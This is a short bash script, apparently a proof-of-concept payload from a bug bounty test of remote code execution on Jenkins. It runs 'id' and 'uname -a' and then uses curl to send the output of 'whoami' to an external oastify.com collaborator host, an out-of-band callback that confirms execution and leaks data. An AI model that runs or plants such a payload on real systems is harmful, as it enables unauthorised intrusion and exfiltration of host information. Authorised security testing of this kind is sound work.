#!/bin/bash
echo "[+] Jenkins RCE test from bug bounty"
id
uname -a
curl http://v956ybil6d9xvgwyjkk3wlmk9bf23srh.oastify.com/$(whoami)
